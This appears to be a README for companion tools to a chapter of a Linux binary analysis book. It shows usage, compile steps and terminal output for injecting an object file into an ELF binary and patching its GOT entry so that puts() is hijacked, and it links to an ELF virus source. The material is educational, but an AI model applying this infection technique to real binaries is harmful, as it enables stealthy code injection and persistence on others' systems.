A couple of programs to use when reading Chapter 2
Learning Linux Binary Analysis by Ryan "Elfmaster" O'Neill

Usage:
    ./relocate <bin> <obj>
    ex. ./relocate htest eputs.o
then
    ./hijack .zyx.tmp.bin puts <vaddr of eputs from reloc output>

Note:
  result bin is not renamed, so infected elf is .zyx.tmp.bin

to use multiple times be sure to make clean to rm .zyx.tmp.bin

Compile:
  for relocate use make
  for hijack gcc -o hijack hijack.c
  for eputs.o gcc -c eputs.c
  for htest gcc -o htest htest.c

Resources:
  https://github.com/elfmaster/skeksi_virus/blob/master/virus.c
  http://bitlackeys.org/projects/quenya_32bit.tgz
  https://www.packtpub.com/networking-and-servers/learning-linux-binary-analysis

Tested on 
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/elf-hijacking $ uname -a
Linux bob-ThinkPad-X1-Carbon-3rd 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

Example output:
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/elf-hijacking $ ./relocate htest eputs.o
[+] loading object eputs.o
[+] Adjust Section Addr [1] 0x004006fc
[+] Adjust Section Addr [3] 0x0040074b
[+] Adjust Section Addr [5] 0x0040074b
[+] Adjust Section Addr [6] 0x0040076b
[+] Adjust Section Addr [7] 0x004007a0
[+] Adjust Section Addr [8] 0x004007a0
[+] Target Addr: 0x0040073a
[+] RelVal 0x0040074b
[+] Reloc ptr (R_X86_64) 0x0040074b
[+] Section Header Reloc 0x0040074b  addr: 0x40073a
[+] Target Addr: 0x00400744
[+] RelVal 0x004006fc
[+] Reloc ptr (R_X86_64_PC32) 0xffffffb4
[+] Section Header Reloc 0x004006fc _write addr: 0x400744
[+] Target Addr: 0x004007c0
[+] RelVal 0x004006fc
[+] Reloc ptr (R_X86_64_PC32) 0xffffff3c
[+] Section Header Reloc 0x004006fc  addr: 0x4007c0
[+] Target Addr: 0x004007e0
[+] RelVal 0x004006fc
[+] Reloc ptr (R_X86_64_PC32) 0xffffff50
[+] Section Header Reloc 0x004006fc  addr: 0x4007e0
[+] memcpy to Objcode 79 bytes
[+] memcpy to Objcode 0 bytes
[+] memcpy to Objcode 32 bytes
[+] memcpy to Objcode 53 bytes
[+] memcpy to Objcode 0 bytes
[+] memcpy to Objcode 88 bytes
[+] Injected code at = 0x004006fc
[+] Found symtab: _write addr: 0x6d4e8218
[+] Add symbol: _write, vaddr 0x004006fc
[+] Sym vaddr: 0x004006fc
[+] Sym Offset: 0x000026d0
[+] Sym Offset: 0x00000018
[+] Write sym ok.
[+] Found symtab: evil_puts addr: 0x6d4e8230
[+] Add symbol: evil_puts, vaddr 0x00400730
[+] Sym vaddr: 0x00400730
[+] Sym Offset: 0x000026e8
[+] Sym Offset: 0x00000018
[+] Write sym ok.
success!
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/elf-hijacking $ ./hijack .zyx.tmp.bin puts 0x00400730
[+] strtab: 0x23dc1318
[+] symtab: 0x23dc12b8
[+] pltgot: 0x23dc3000
[+] puts symbol index: 1
[+] gotaddr: 0x00601018 gotoff: 0x00002018
[+] patched GOT entry 0x00601018 with address 0x00400730
[+} Success!
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/elf-hijacking $ ./.zyx.tmp.bin 
HAHA puts() has been hijacked!
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/elf-hijacking $ 
